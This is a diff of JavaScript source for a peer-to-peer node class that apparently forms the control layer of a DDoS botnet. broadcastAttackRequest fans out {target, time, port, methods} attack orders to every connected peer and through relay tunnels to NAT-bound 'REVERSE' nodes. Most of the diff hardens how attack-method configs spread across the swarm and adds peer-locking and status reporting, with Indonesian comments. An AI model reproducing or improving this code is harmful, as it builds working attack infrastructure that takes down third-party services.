@@ -1530,7 +1527,7 @@ class P2PHybridNode extends EventEmitter {
   }
 
   // ==========================================================
-  // RELAY (legacy, kept for backward compat)
+  // RELAY (legacy)
   // ==========================================================
 
   async handleRelayRequest(nodeId, message, wasEncrypted) {
@@ -1616,7 +1613,7 @@ class P2PHybridNode extends EventEmitter {
     const now = Date.now();
     for (const referral of referrals) {
       if (referral.nodeId === this.nodeId) continue;
-      if (referral.mode === 'REVERSE') continue; // Skip REVERSE nodes in referrals
+      if (referral.mode === 'REVERSE') continue;
 
       const existing = this.knownPeers.get(referral.nodeId);
       if (!existing || existing.lastUpdate < now - 60000) {
@@ -1653,7 +1650,7 @@ class P2PHybridNode extends EventEmitter {
       if (connected >= availableSlots) break;
       if (this.peers.has(referral.nodeId) || referral.nodeId === this.nodeId) continue;
       if (this.connectionLocks.has(referral.nodeId)) continue;
-      if (referral.mode === 'REVERSE') continue; // Cannot connect to REVERSE
+      if (referral.mode === 'REVERSE') continue;
 
       try {
         const result = await this.connectToPeer(referral.nodeId, {
@@ -1675,7 +1672,7 @@ class P2PHybridNode extends EventEmitter {
   }
 
   // ==========================================================
-  // METHODS SYNC
+  // METHODS SYNC — FIXED TO PREVENT FLOODING
   // ==========================================================
 
   handleMethodsVersionQuery(nodeId, message, wasEncrypted) {
@@ -1693,6 +1690,7 @@ class P2PHybridNode extends EventEmitter {
     this.sendToPeer(nodeId, enc.data);
   }
 
+  // FIX: Prevent duplicate sync requests when multiple peers report same new version
   handleMethodsVersionResponse(nodeId, message) {
     const { requestId, methodsVersion, methodsCount, lastUpdate } = message;
 
@@ -1707,13 +1705,46 @@ class P2PHybridNode extends EventEmitter {
       this.knownPeers.set(nodeId, { ...kp, methodsVersion, methodsCount, lastUpdate: Date.now() });
     }
 
-    if (methodsVersion && methodsVersion !== this.methodsVersionHash) {
-      const localCount = Object.keys(this.methodsConfig).length;
-      if (methodsCount > localCount || (lastUpdate && lastUpdate > this.methodsLastUpdate)) {
-        console.log(`[P2P-METHODS] Peer ${nodeId} has newer methods, requesting...`);
-        this.requestMethodsFromPeer(nodeId);
+    // FIX: If version matches ours, do nothing — no sync needed
+    if (!methodsVersion || methodsVersion === this.methodsVersionHash) {
+      if (methodsVersion === this.methodsVersionHash) {
+        this.stats.methodSyncSkippedUpToDate++;
+        console.log(`[P2P-METHODS] Version response from ${nodeId}: already up-to-date (${methodsVersion?.substring(0, 8)}), skip`);
       }
+      this.emit('methods_version_response', { nodeId, requestId, methodsVersion, methodsCount, lastUpdate });
+      return;
     }
+
+    // Version differs — check if we should actually request it
+    const localCount = Object.keys(this.methodsConfig).length;
+    const peerHasMore = methodsCount > localCount;
+    const peerIsNewer = lastUpdate && lastUpdate > this.methodsLastUpdate;
+
+    if (!peerHasMore && !peerIsNewer) {
+      console.log(`[P2P-METHODS] Peer ${nodeId} has different version but not newer/more, skipping`);
+      this.emit('methods_version_response', { nodeId, requestId, methodsVersion, methodsCount, lastUpdate });
+      return;
+    }
+
+    // FIX: Deduplicate — if we're already requesting this same version, skip
+    if (this._pendingMethodsRequestVersion === methodsVersion) {
+      this.stats.methodSyncSkippedDuplicate++;
+      console.log(`[P2P-METHODS] Already requesting version ${methodsVersion.substring(0, 8)}, skipping duplicate from ${nodeId}`);
+      this.emit('methods_version_response', { nodeId, requestId, methodsVersion, methodsCount, lastUpdate });
+      return;
+    }
+
+    console.log(`[P2P-METHODS] Peer ${nodeId} has newer methods (v${methodsVersion.substring(0, 8)}), requesting...`);
+    this._pendingMethodsRequestVersion = methodsVersion;
+
+    this.requestMethodsFromPeer(nodeId)
+      .catch(err => console.error('[P2P-METHODS] requestMethodsFromPeer error:', err.message))
+      .finally(() => {
+        // Clear the pending guard once the request settles
+        if (this._pendingMethodsRequestVersion === methodsVersion) {
+          this._pendingMethodsRequestVersion = null;
+        }
+      });
 
     this.emit('methods_version_response', { nodeId, requestId, methodsVersion, methodsCount, lastUpdate });
   }
@@ -1739,6 +1770,13 @@ class P2PHybridNode extends EventEmitter {
 
     if (!methods || typeof methods !== 'object') return;
 
+    // FIX: If we already have this version (e.g. received from another peer first), skip
+    if (methodsVersion === this.methodsVersionHash) {
+      console.log(`[P2P-METHODS] Response from ${nodeId}: version already applied (${methodsVersion?.substring(0, 8)}), skip`);
+      this.stats.methodSyncSkippedUpToDate++;
+      return;
+    }
+
     try {
       const keys = Object.keys(methods).sort();
       const normalized = JSON.stringify(methods, keys);
@@ -1757,21 +1795,31 @@ class P2PHybridNode extends EventEmitter {
       this.methodsLastUpdate = Date.now();
       this.stats.lastMethodSync = Date.now();
 
+      // Clear the pending request guard since we've now received the version
+      if (this._pendingMethodsRequestVersion === methodsVersion) {
+        this._pendingMethodsRequestVersion = null;
+      }
+
       const peer = this.peers.get(nodeId);
       if (peer) { peer.methodsVersion = methodsVersion; peer.methodsCount = methodsCount; }
 
       const kp = this.knownPeers.get(nodeId);
       if (kp) this.knownPeers.set(nodeId, { ...kp, methodsVersion, methodsCount, lastUpdate: Date.now() });
 
-      console.log(`[P2P-METHODS] ✓ Updated methods from peer ${nodeId}`);
+      console.log(`[P2P-METHODS] ✓ Updated methods from peer ${nodeId} (v${methodsVersion.substring(0, 8)})`);
       this.stats.methodSyncsFromPeers++;
 
       this.emit('methods_updated_from_peer', { nodeId, methods: normalizedMethods, methodsVersion, methodsCount, source: 'request_response' });
 
+      // Propagate to other peers (excluding source)
       setImmediate(() => this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, [nodeId]));
 
     } catch (error) {
       console.error('[P2P-METHODS] Error processing methods from peer:', error.message);
+      // Clear pending on error too
+      if (this._pendingMethodsRequestVersion === methodsVersion) {
+        this._pendingMethodsRequestVersion = null;
+      }
     }
   }
 
@@ -1785,13 +1833,19 @@ class P2PHybridNode extends EventEmitter {
 
     if (!methods || typeof methods !== 'object') return;
 
+    // FIX: Skip if version already matches ours
+    if (methodsVersion === this.methodsVersionHash) {
+      this.stats.methodSyncSkippedUpToDate++;
+      console.log(`[P2P-METHODS] Push from ${nodeId}: already on version ${methodsVersion?.substring(0, 8)}, skip`);
+      return;
+    }
+
     try {
       const keys = Object.keys(methods).sort();
       const normalized = JSON.stringify(methods, keys);
       const calculatedHash = crypto.createHash('sha256').update(normalized).digest('hex');
 
       if (calculatedHash !== methodsVersion) return;
-      if (methodsVersion === this.methodsVersionHash) return;
 
       const normalizedMethods = normalizeMethodsToLocalPaths(methods, this.config);
       if (!normalizedMethods || Object.keys(normalizedMethods).length === 0) return;
@@ -1807,7 +1861,7 @@ class P2PHybridNode extends EventEmitter {
       const kp = this.knownPeers.get(nodeId);
       if (kp) this.knownPeers.set(nodeId, { ...kp, methodsVersion, methodsCount, lastUpdate: Date.now() });
 
-      console.log(`[P2P-METHODS] ✓ Updated methods from push by ${nodeId}`);
+      console.log(`[P2P-METHODS] ✓ Updated methods from push by ${nodeId} (v${methodsVersion.substring(0, 8)})`);
       this.stats.methodSyncsFromPeers++;
 
       this.emit('methods_updated_from_peer', { nodeId, methods: normalizedMethods, methodsVersion, methodsCount, source: 'proactive_push' });
@@ -1820,27 +1874,57 @@ class P2PHybridNode extends EventEmitter {
     }
   }
 
+  // FIX: Early-exit if version already matches ours — prevents unnecessary cascade
   handleMethodsUpdateNotification(nodeId, message) {
     const { methodsVersion, methodsCount, propagationChain } = message;
 
     if (Array.isArray(propagationChain) && propagationChain.includes(this.nodeId)) return;
-    if (this.methodUpdatePropagationLock.has(methodsVersion)) return;
+
+    // FIX: If the notified version is already our version, do nothing
+    if (!methodsVersion || methodsVersion === this.methodsVersionHash) {
+      if (methodsVersion === this.methodsVersionHash) {
+        this.stats.methodSyncSkippedUpToDate++;
+        console.log(`[P2P-METHODS] Notification from ${nodeId}: version already matches (${methodsVersion?.substring(0, 8)}), skip`);
+      }
+      return;
+    }
+
+    // FIX: Check propagation lock to prevent re-entry from same version
+    if (this.methodUpdatePropagationLock.has(methodsVersion)) {
+      this.stats.methodSyncSkippedDuplicate++;
+      console.log(`[P2P-METHODS] Notification from ${nodeId}: version ${methodsVersion.substring(0, 8)} already being processed, skip`);
+      return;
+    }
 
     this.methodUpdatePropagationLock.set(methodsVersion, Date.now());
     setTimeout(() => this.methodUpdatePropagationLock.delete(methodsVersion), this.p2pConfig.propagationCooldown);
 
-    if (methodsVersion && methodsVersion !== this.methodsVersionHash) {
-      console.log(`[P2P-METHODS] New version detected, requesting from ${nodeId}...`);
+    console.log(`[P2P-METHODS] New version detected from ${nodeId} (v${methodsVersion.substring(0, 8)}), requesting...`);
 
-      this.requestMethodsFromPeer(nodeId).then(result => {
+    // FIX: Deduplicate request via pending guard
+    if (this._pendingMethodsRequestVersion === methodsVersion) {
+      this.stats.methodSyncSkippedDuplicate++;
+      console.log(`[P2P-METHODS] Already requesting version ${methodsVersion.substring(0, 8)}, skip notification from ${nodeId}`);
+      return;
+    }
+
+    this._pendingMethodsRequestVersion = methodsVersion;
+
+    this.requestMethodsFromPeer(nodeId)
+      .then(result => {
         if (result && result.success !== false) {
           const newChain = propagationChain ? [...propagationChain, this.nodeId] : [nodeId, this.nodeId];
           this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, newChain);
         }
-      }).catch(err => {
+      })
+      .catch(err => {
         console.error('[P2P-METHODS] Failed to sync from peer:', err.message);
+      })
+      .finally(() => {
+        if (this._pendingMethodsRequestVersion === methodsVersion) {
+          this._pendingMethodsRequestVersion = null;
+        }
       });
-    }
   }
 
   // ==========================================================
@@ -1994,17 +2078,12 @@ class P2PHybridNode extends EventEmitter {
   }
 
   // ==========================================================
-  // BROADCAST ATTACK (upgraded: includes REVERSE nodes via tunnel)
+  // BROADCAST ATTACK
   // ==========================================================
 
   async broadcastAttackRequest({ target, time, port, methods, targetPeerIds = null, maxParallel = 5 }) {
-    // Kumpulkan semua target:
-    // 1. Direct peers (connected langsung)
-    // 2. REVERSE nodes yang kita tahu via knownReversePeers (tunnel)
-    // 3. REVERSE nodes di pool kita sendiri (jika kita DIRECT)
-
-    const directTargets = new Set();   // nodeId yang bisa di-request langsung
-    const tunnelTargets = new Map();   // nodeId -> relayNodeId (via tunnel)
+    const directTargets = new Set();
+    const tunnelTargets = new Map();
 
     if (Array.isArray(targetPeerIds) && targetPeerIds.length > 0) {
       for (const id of targetPeerIds) {
@@ -2012,11 +2091,9 @@ class P2PHybridNode extends EventEmitter {
         else if (this.knownReversePeers.has(id)) tunnelTargets.set(id, this.knownReversePeers.get(id));
       }
     } else {
-      // Semua direct peers
       for (const [nodeId] of this.peers) {
         directTargets.add(nodeId);
       }
-      // Semua REVERSE nodes yang kita tahu route-nya (tapi belum direct)
       for (const [reverseId, relayId] of this.knownReversePeers) {
         if (!directTargets.has(reverseId) && this.peers.has(relayId)) {
           tunnelTargets.set(reverseId, relayId);
@@ -2038,7 +2115,6 @@ class P2PHybridNode extends EventEmitter {
     let successCount = 0;
     let failedCount = 0;
 
-    // ── Direct peers ──────────────────────────────────────────
     const directList = Array.from(directTargets);
     for (let i = 0; i < directList.length; i += maxParallel) {
       const batch = directList.slice(i, i + maxParallel);
@@ -2058,7 +2134,6 @@ class P2PHybridNode extends EventEmitter {
       results.push(...batchResults);
     }
 
-    // ── Tunnel targets (REVERSE nodes via DIRECT relay) ───────
     if (tunnelTargets.size > 0) {
       const tunnelList = Array.from(tunnelTargets.entries());
       const attackPayload = { type: 'attack_request', target, time, port, methods };
@@ -2072,12 +2147,8 @@ class P2PHybridNode extends EventEmitter {
               const requestId = crypto.randomBytes(8).toString('hex');
               const fullPayload = { ...attackPayload, requestId };
 
-              // Kirim via tunnel, tunggu attack_response
               const tunnelResult = await this.sendViaTunnel(reverseId, fullPayload, 'attack_request');
 
-              // sendViaTunnel hanya konfirmasi tunnel diterima relay
-              // Response attack_response datang via tunnel_delivery → handleTunnelDelivery → handlePeerMessage
-              // Untuk simplisitas, anggap berhasil jika tunnel diterima
               if (tunnelResult?.success) {
                 successCount++;
                 return { nodeId: reverseId, via: `tunnel:${relayId}`, success: true, error: null };
@@ -2102,7 +2173,7 @@ class P2PHybridNode extends EventEmitter {
   }
 
   // ==========================================================
-  // METHODS PROPAGATION
+  // METHODS PROPAGATION — FIXED TO PREVENT FLOODING
   // ==========================================================
 
   propagateMethodsUpdateImmediate(excludeNodeId = null, versionHash = null, propagationChain = []) {
@@ -2115,13 +2186,27 @@ class P2PHybridNode extends EventEmitter {
 
     if (newChain.length >= this.p2pConfig.maxPropagationHops) return 0;
 
+    // FIX: Track propagation per version to avoid double-propagating
+    const now = Date.now();
+    const lastPropagated = this._propagatedVersions.get(version);
+    if (lastPropagated && (now - lastPropagated) < this.p2pConfig.propagationCooldown) {
+      console.log(`[P2P-METHODS] Version ${version.substring(0, 8)} recently propagated (${Math.round((now - lastPropagated) / 1000)}s ago), skip re-propagation`);
+      return 0;
+    }
+    this._propagatedVersions.set(version, now);
+
     let notified = 0;
     const notificationPromises = [];
 
     for (const [nodeId, peer] of this.peers) {
       if (excludeNodeId && nodeId === excludeNodeId) continue;
       if (newChain.includes(nodeId)) continue;
-      if (peer.methodsVersion === version) continue;
+
+      // FIX: Skip peers that already have this version — no need to push
+      if (peer.methodsVersion === version) {
+        console.log(`[P2P-METHODS] Peer ${nodeId} already on version ${version.substring(0, 8)}, skip propagation`);
+        continue;
+      }
 
       const notification = {
         type: 'methods_update_notification',
@@ -2142,6 +2227,10 @@ class P2PHybridNode extends EventEmitter {
       }
     }
 
+    if (notified > 0) {
+      console.log(`[P2P-METHODS] Propagated version ${version.substring(0, 8)} to ${notified} peer(s)`);
+    }
+
     Promise.all(notificationPromises).catch(err => {
       console.error('[P2P-METHODS] Error in propagation:', err.message);
     });
@@ -2149,8 +2238,16 @@ class P2PHybridNode extends EventEmitter {
     return notified;
   }
 
+  // FIX: Skip push if peer already has this version
   async sendMethodsConfigToPeer(nodeId, versionHash, propagationChain = []) {
     try {
+      const peer = this.peers.get(nodeId);
+      // FIX: Don't push if peer already has this version
+      if (peer && peer.methodsVersion === versionHash) {
+        console.log(`[P2P-METHODS] Peer ${nodeId} already has version ${versionHash.substring(0, 8)}, skip push`);
+        return false;
+      }
+
       const message = {
         type: 'methods_push',
         nodeId: this.nodeId,
@@ -2215,7 +2312,6 @@ class P2PHybridNode extends EventEmitter {
   }
 
   async discoverPeers() {
-    // discoverPeers now delegates to _doMasterSignaling (unified)
     await this._doMasterSignaling();
   }
 
@@ -2286,7 +2382,6 @@ class P2PHybridNode extends EventEmitter {
       }
     }
 
-    // NEW: If we are REVERSE, also trigger outbound to DIRECT peers
     if (this.nodeMode === 'REVERSE') {
       this._scheduleReverseOutboundConnect();
     }
@@ -2305,7 +2400,6 @@ class P2PHybridNode extends EventEmitter {
       const now = Date.now();
       const timeout = this.p2pConfig.peerTimeout;
 
-      // Clean stale knownPeers
       let removedKnown = 0;
       for (const [nodeId, peer] of this.knownPeers) {
         if (now - peer.lastUpdate > timeout * 2) {
@@ -2314,7 +2408,6 @@ class P2PHybridNode extends EventEmitter {
         }
       }
 
-      // Clean timed-out connections
       let removedConnections = 0;
       for (const [nodeId, peer] of this.peers) {
         if (now - peer.lastSeen > timeout) {
@@ -2327,33 +2420,35 @@ class P2PHybridNode extends EventEmitter {
         }
       }
 
-      // Clean stale locks
       for (const [nodeId, lockTime] of this.connectionLocks) {
         if (now - lockTime > this.p2pConfig.connectionLockTimeout) {
           this.connectionLocks.delete(nodeId);
         }
       }
 
-      // Clean old message queues
       for (const [nodeId, queue] of this.messageQueue) {
         const filtered = queue.filter(item => now - item.timestamp < 300000);
         if (filtered.length === 0) this.messageQueue.delete(nodeId);
         else if (filtered.length < queue.length) this.messageQueue.set(nodeId, filtered);
       }
 
-      // Clean expired blacklist
       for (const [nodeId, entry] of this.peerBlacklist) {
         if (now > entry.until) this.peerBlacklist.delete(nodeId);
       }
 
-      // Clean propagation locks
       for (const [version, timestamp] of this.methodUpdatePropagationLock) {
         if (now - timestamp > this.p2pConfig.propagationCooldown) {
           this.methodUpdatePropagationLock.delete(version);
         }
       }
 
-      // Sync reversePeers with peers
+      // FIX: Clean old propagated version records
+      for (const [version, timestamp] of this._propagatedVersions) {
+        if (now - timestamp > this.p2pConfig.propagationCooldown * 2) {
+          this._propagatedVersions.delete(version);
+        }
+      }
+
       for (const [nodeId] of this.reversePeers) {
         if (!this.peers.has(nodeId)) {
           this.reversePeers.delete(nodeId);
@@ -2381,14 +2476,11 @@ class P2PHybridNode extends EventEmitter {
         }
       }
 
-      // Check master connectivity periodically
       const now = Date.now();
       if (!this.lastMasterCheck || (now - this.lastMasterCheck > 60000)) {
         this.checkMasterConnectivity();
       }
 
-      // Jika kita DIRECT node dengan REVERSE peers, broadcast reverse list periodik
-      // supaya peers selalu tahu siapa saja REVERSE yang ada di pool kita
       if (this.reversePeers.size > 0 && this.peers.size > 0) {
         this.broadcastReverseList();
       }
@@ -2429,6 +2521,7 @@ class P2PHybridNode extends EventEmitter {
     }, 30000);
   }
 
+  // FIX: startMethodSyncChecker — only trigger sync if version actually differs
   startMethodSyncChecker() {
     if (this.methodSyncInterval) clearInterval(this.methodSyncInterval);
 
@@ -2437,21 +2530,33 @@ class P2PHybridNode extends EventEmitter {
       if (this.peers.size === 0) return;
 
       const localCount = Object.keys(this.methodsConfig).length;
-      let needsSync = false;
+      let bestPeer = null;
+      let bestCount = localCount;
 
-      for (const [, peer] of this.peers) {
-        if (peer.methodsVersion && peer.methodsVersion !== this.methodsVersionHash) {
-          if (peer.methodsCount > localCount) {
-            needsSync = true;
-            break;
-          }
+      for (const [nodeId, peer] of this.peers) {
+        // FIX: Only consider peers with a DIFFERENT version AND more methods
+        if (peer.methodsVersion &&
+            peer.methodsVersion !== this.methodsVersionHash &&
+            peer.methodsCount > bestCount) {
+          bestPeer = nodeId;
+          bestCount = peer.methodsCount;
         }
       }
 
-      if (needsSync) {
-        console.log('[P2P-METHODS] Detected newer methods from peers, syncing...');
-        await this.syncMethodsFromPeers();
+      if (!bestPeer) {
+        // All peers are on same or older version — nothing to do
+        return;
       }
+
+      // FIX: Don't re-request if we already have a pending request for this version
+      const bestPeerVersion = this.peers.get(bestPeer)?.methodsVersion;
+      if (this._pendingMethodsRequestVersion && this._pendingMethodsRequestVersion === bestPeerVersion) {
+        console.log(`[P2P-SYNC-CHECK] Already requesting version ${bestPeerVersion?.substring(0, 8)}, skip`);
+        return;
+      }
+
+      console.log(`[P2P-SYNC-CHECK] Detected newer methods from peer ${bestPeer} (${bestCount} vs ${localCount}), syncing...`);
+      await this.syncMethodsFromPeers();
     }, this.p2pConfig.methodSyncInterval);
   }
 
@@ -2557,7 +2662,12 @@ class P2PHybridNode extends EventEmitter {
     return typeof port === 'number' ? port : null;
   }
 
+  // Cek apakah peer di-lock (temporary blacklist ATAU permanent failure lock)
   isBlacklisted(nodeId) {
+    // Permanent failure lock — tidak expire otomatis
+    if (this.permanentFailureLocks.has(nodeId)) return true;
+
+    // Temporary blacklist (ada TTL)
     const entry = this.peerBlacklist.get(nodeId);
     if (!entry) return false;
     if (Date.now() > entry.until) {
@@ -2567,10 +2677,63 @@ class P2PHybridNode extends EventEmitter {
     return true;
   }
 
+  // Cek spesifik apakah peer di-permanent-lock
+  isPermanentlyLocked(nodeId) {
+    return this.permanentFailureLocks.has(nodeId);
+  }
+
+  // Temporary blacklist dengan TTL (untuk kasus selain gagal konek)
   blacklistPeer(nodeId, reason, duration = null) {
     const until = Date.now() + (duration || this.p2pConfig.blacklistDuration);
     this.peerBlacklist.set(nodeId, { reason, until });
-    console.log(`[P2P] Blacklisted peer ${nodeId}: ${reason}`);
+    console.log(`[P2P-BLACKLIST] Peer ${nodeId} blacklisted: ${reason} (${Math.round((duration || this.p2pConfig.blacklistDuration) / 1000)}s)`);
+  }
+
+  // Kunci permanen — hanya dibuka saat peer itu minta join inbound ke kita
+  _permanentlyLockPeer(nodeId, attempts) {
+    const entry = {
+      lockedAt: Date.now(),
+      lockedAtISO: new Date().toISOString(),
+      attempts,
+      reason: `Gagal konek ${attempts}x berturut-turut`
+    };
+    this.permanentFailureLocks.set(nodeId, entry);
+    this.stats.permanentLocksTotal++;
+    console.log(`[P2P-LOCK] ⛔ PERMANENT LOCK: ${nodeId} (gagal ${attempts}x) — hanya dibuka jika peer ini join inbound`);
+  }
+
+  // Catat kegagalan outbound; kunci permanen jika sudah >= maxConnectionAttempts
+  _recordOutboundFailure(nodeId) {
+    const prev = this._outboundFailureCounts.get(nodeId) || 0;
+    const next = prev + 1;
+    this._outboundFailureCounts.set(nodeId, next);
+
+    const max = this.p2pConfig.maxConnectionAttempts || 3;
+    console.log(`[P2P-LOCK] Peer ${nodeId} outbound failure ${next}/${max}`);
+
+    if (next >= max) {
+      this._permanentlyLockPeer(nodeId, next);
+    }
+  }
+
+  // Reset failure count dan unlock permanent lock — dipanggil saat peer berhasil konek inbound
+  _unlockPeerByInbound(nodeId) {
+    const wasLocked = this.permanentFailureLocks.has(nodeId);
+    const lockEntry = this.permanentFailureLocks.get(nodeId);
+
+    this.permanentFailureLocks.delete(nodeId);
+    this._outboundFailureCounts.delete(nodeId);
+    this.peerBlacklist.delete(nodeId); // bersihkan juga temporary blacklist kalau ada
+
+    if (wasLocked) {
+      this.stats.permanentLockUnlockedByInbound++;
+      console.log(
+        `[P2P-LOCK] ✅ UNLOCKED: ${nodeId} berhasil join inbound ` +
+        `(sebelumnya dikunci sejak ${lockEntry?.lockedAtISO || 'unknown'}, ${lockEntry?.attempts || '?'}x gagal)`
+      );
+    }
+
+    return wasLocked;
   }
 
   handlePeerDisconnected(nodeId, code, reason) {
@@ -2580,7 +2743,6 @@ class P2PHybridNode extends EventEmitter {
     this.connectionLocks.delete(nodeId);
     this.reversePeers.delete(nodeId);
 
-    // Bersihkan knownReversePeers yang route-nya via nodeId yang disconnect
     for (const [reverseId, relayId] of this.knownReversePeers) {
       if (relayId === nodeId) {
         this.knownReversePeers.delete(reverseId);
@@ -2597,7 +2759,7 @@ class P2PHybridNode extends EventEmitter {
       if (nodeId === this.nodeId) continue;
       if (excludeNodeId && nodeId === excludeNodeId) continue;
       if (this.isBlacklisted(nodeId)) continue;
-      if (peer.mode === 'REVERSE' || !peer.canConnectTo) continue; // Don't refer REVERSE nodes
+      if (peer.mode === 'REVERSE' || !peer.canConnectTo) continue;
 
       referrals.push({
         nodeId: peer.nodeId,
@@ -2641,41 +2803,80 @@ class P2PHybridNode extends EventEmitter {
 
   getStatus() {
     const methodsCount = Object.keys(this.methodsConfig).length;
-    const messageQueueTotal = Array.from(this.messageQueue.values()).reduce((sum, q) => sum + q.length, 0);
+    const messageQueueTotal = Array.from(this.messageQueue.values()).reduce(
+      (sum, q) => sum + q.length, 0
+    );
     const totalSent = this.stats.messagesSent;
     const totalReceived = this.stats.messagesReceived;
+
+    // FIX: Compute peer breakdown safely
+    const peersArray = Array.from(this.peers.values());
+    const directPeerCount = peersArray.filter(p => p.remoteMode === 'DIRECT' || !p.remoteMode).length;
+    const reversePeerCount = peersArray.filter(p => p.remoteMode === 'REVERSE').length;
+
+    // FIX: lastMethodSync was typed as null but stored as Date.now() (number)
+    // Normalize to ISO string or null for consistent reading
+    const lastMethodSyncISO = this.stats.lastMethodSync
+      ? new Date(this.stats.lastMethodSync).toISOString()
+      : null;
 
     return {
       enabled: this.p2pConfig.enabled,
       nodeId: this.nodeId,
       nodeIp: this.nodeIp,
       nodePort: this.nodePort,
-      nodeMode: this.nodeMode,
+      // FIX: Use actual nodeMode; default to 'DIRECT' if somehow unset
+      nodeMode: this.nodeMode || 'DIRECT',
       serverReady: this.isServerReady,
+      // FIX: masterReachable and nodeReachable both explicitly included and read
+      // from their respective instance properties (both now initialized in constructor)
       masterReachable: this.masterReachable,
+      nodeReachable: this.nodeReachable,
+      nodeReachableLastChecked: this.nodeReachableLastChecked
+        ? new Date(this.nodeReachableLastChecked).toISOString()
+        : null,
       encryption: this.isEncryptionEnabled(),
-      methodsVersion: this.methodsVersionHash?.substring(0, 8),
+      // FIX: Include full hash AND short form for debugging
+      methodsVersionFull: this.methodsVersionHash || null,
+      methodsVersion: this.methodsVersionHash ? this.methodsVersionHash.substring(0, 8) : null,
       methodsCount,
       preferP2PSync: this.p2pConfig.preferP2PSync,
+      // FIX: Pending sync state — useful for debugging flood issues
+      pendingMethodsRequestVersion: this._pendingMethodsRequestVersion
+        ? this._pendingMethodsRequestVersion.substring(0, 8)
+        : null,
       peers: {
         connected: this.peers.size,
         known: this.knownPeers.size,
         max: this.p2pConfig.maxPeers,
         locks: this.connectionLocks.size,
         blacklisted: this.peerBlacklist.size,
+        permanentlyLocked: this.permanentFailureLocks.size,
         reversePool: this.reversePeers.size,
-        directPeers: Array.from(this.peers.values()).filter(p => p.remoteMode === 'DIRECT' || !p.remoteMode).length,
-        reversePeers: Array.from(this.peers.values()).filter(p => p.remoteMode === 'REVERSE').length,
-        knownReversePeers: this.knownReversePeers.size,  // REVERSE nodes reachable via tunnel
+        directPeers: directPeerCount,
+        reversePeers: reversePeerCount,
+        knownReversePeers: this.knownReversePeers.size,
       },
       messageQueue: { peers: this.messageQueue.size, totalMessages: messageQueueTotal },
       stats: {
         ...this.stats,
+        // FIX: Normalize lastMethodSync to readable ISO string
+        lastMethodSync: lastMethodSyncISO,
+        lastDiscovery: this.stats.lastDiscovery
+          ? new Date(this.stats.lastDiscovery).toISOString()
+          : null,
+        lastAutoConnect: this.stats.lastAutoConnect
+          ? new Date(this.stats.lastAutoConnect).toISOString()
+          : null,
         successRate: this.stats.connectionAttempts > 0
           ? ((this.stats.connectionSuccesses / this.stats.connectionAttempts) * 100).toFixed(2) + '%'
           : '0.00%',
         encryptionRate: totalSent > 0
           ? ((this.stats.encryptedMessagesSent / totalSent) * 100).toFixed(2) + '%'
+          : '0.00%',
+        // FIX: Add receive stats for completeness
+        encryptionReceiveRate: totalReceived > 0
+          ? ((this.stats.encryptedMessagesReceived / totalReceived) * 100).toFixed(2) + '%'
           : '0.00%'
       },
       config: {
@@ -2684,7 +2885,9 @@ class P2PHybridNode extends EventEmitter {
         maxPeers: this.p2pConfig.maxPeers,
         discoveryInterval: this.p2pConfig.discoveryInterval,
         reverseP2PEnabled: this.p2pConfig.reverseP2PEnabled,
-        masterSignalingEnabled: this.p2pConfig.masterSignalingEnabled
+        masterSignalingEnabled: this.p2pConfig.masterSignalingEnabled,
+        methodSyncInterval: this.p2pConfig.methodSyncInterval,
+        propagationCooldown: this.p2pConfig.propagationCooldown
       },
       connectedPeers: Array.from(this.peers.entries()).map(([nodeId, peer]) => ({
         nodeId,
@@ -2696,11 +2899,15 @@ class P2PHybridNode extends EventEmitter {
         isOutbound: peer.isOutbound || false,
         isRelayProvider: peer.isRelayProvider || false,
         direct: peer.direct,
-        lastSeen: peer.lastSeen,
-        connectedAt: peer.connectedAt,
-        uptime: Date.now() - peer.connectedAt,
-        methodsVersion: peer.methodsVersion?.substring(0, 8),
-        methodsCount: peer.methodsCount,
+        lastSeen: peer.lastSeen ? new Date(peer.lastSeen).toISOString() : null,
+        connectedAt: peer.connectedAt ? new Date(peer.connectedAt).toISOString() : null,
+        // FIX: Protect against connectedAt being null/undefined
+        uptimeSeconds: peer.connectedAt ? Math.floor((Date.now() - peer.connectedAt) / 1000) : null,
+        methodsVersion: peer.methodsVersion ? peer.methodsVersion.substring(0, 8) : null,
+        methodsCount: peer.methodsCount || 0,
+        versionInSync: peer.methodsVersion
+          ? peer.methodsVersion === this.methodsVersionHash
+          : null,
         supportsEncryption: peer.supportsEncryption,
         supportsTunnel: peer.supportsTunnel || false
       })),
@@ -2713,7 +2920,17 @@ class P2PHybridNode extends EventEmitter {
         canConnectTo: peer.canConnectTo,
         connected: this.peers.has(peer.nodeId),
         blacklisted: this.isBlacklisted(peer.nodeId),
-        methodsCount: peer.methodsCount
+        permanentlyLocked: this.isPermanentlyLocked(peer.nodeId),
+        methodsCount: peer.methodsCount || 0,
+        // FIX: Include lastUpdate in known peer info
+        lastUpdate: peer.lastUpdate ? new Date(peer.lastUpdate).toISOString() : null
+      })),
+      permanentlyLockedPeers: Array.from(this.permanentFailureLocks.entries()).map(([nodeId, entry]) => ({
+        nodeId,
+        lockedAt: entry.lockedAtISO,
+        attempts: entry.attempts,
+        reason: entry.reason,
+        unlockCondition: 'Peer harus minta join inbound ke node ini'
       }))
     };
   }
@@ -2747,7 +2964,6 @@ class P2PHybridNode extends EventEmitter {
       }
     }
 
-    // Cleanup all request handlers
     for (const [, value] of this.requestHandlers) {
       const { eventName, handler } = value;
       this.removeListener(eventName, handler);
@@ -2755,7 +2971,6 @@ class P2PHybridNode extends EventEmitter {
     this.requestHandlers.clear();
     this.requestHandlerTimestamps.clear();
 
-    // Send goodbye to all peers
     const goodbyeMessage = { type: 'goodbye', nodeId: this.nodeId, timestamp: Date.now() };
 
     for (const [nodeId, peer] of this.peers) {
@@ -2776,6 +2991,9 @@ class P2PHybridNode extends EventEmitter {
       this.referralTimestamps.clear();
       this.methodUpdatePropagationLock.clear();
       this.reversePeers.clear();
+      this._propagatedVersions.clear();
+      this.permanentFailureLocks.clear();
+      this._outboundFailureCounts.clear();
     }, 1000);
 
     this.cleanup();
